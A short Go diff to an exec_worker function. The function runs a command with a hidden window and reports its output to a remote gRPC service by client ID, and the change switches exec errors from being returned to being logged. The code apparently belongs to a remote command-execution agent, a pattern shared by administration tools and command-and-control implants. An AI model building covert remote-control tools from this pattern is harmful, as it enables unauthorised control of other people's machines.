@@ -231,7 +231,7 @@ func exec_worker(client pb.ConsumerClient, ctx context.Context, pid string) erro
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		out, err := cmd.CombinedOutput()
 		if err != nil {
-			return fmt.Errorf("error during exec: %v", err)
+			log.Printf("error during exec: %v\n", err)
 		}
 		client.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
 	}
